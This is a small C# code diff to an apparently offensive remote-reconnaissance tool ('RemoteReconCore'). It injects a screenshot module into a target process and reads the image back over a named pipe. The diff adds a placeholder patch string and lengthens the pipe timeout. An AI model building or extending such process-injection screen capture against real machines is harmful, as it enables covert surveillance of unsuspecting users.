@@ -19,7 +19,7 @@ namespace RemoteReconCore
         {
             string image = "";
             //Inject the recon module for screenshot into the target process.
-            byte[] screenshotMod = Agent.PatchRemoteReconNative("screenshot");
+            byte[] screenshotMod = Agent.PatchRemoteReconNative("screenshot", toReplace);
             Injector screenshot = new Injector(targetPid, screenshotMod);
 
 #if DEBUG
@@ -38,7 +38,7 @@ namespace RemoteReconCore
                     //Connect to the named pipe server and read the screen shot image.
                     NamedPipeClientStream client = new NamedPipeClientStream(".", "svc_ss", PipeDirection.InOut);
 
-                    client.Connect((1000 * Agent.sleep));
+                    client.Connect((2000 * Agent.sleep));
                     StreamReader reader = new StreamReader(client);
                     image = reader.ReadLine();
 
@@ -58,5 +58,7 @@ namespace RemoteReconCore
                 }
             }
         }
+
+        private string toReplace = "Replace-Me  ";
     }
 }
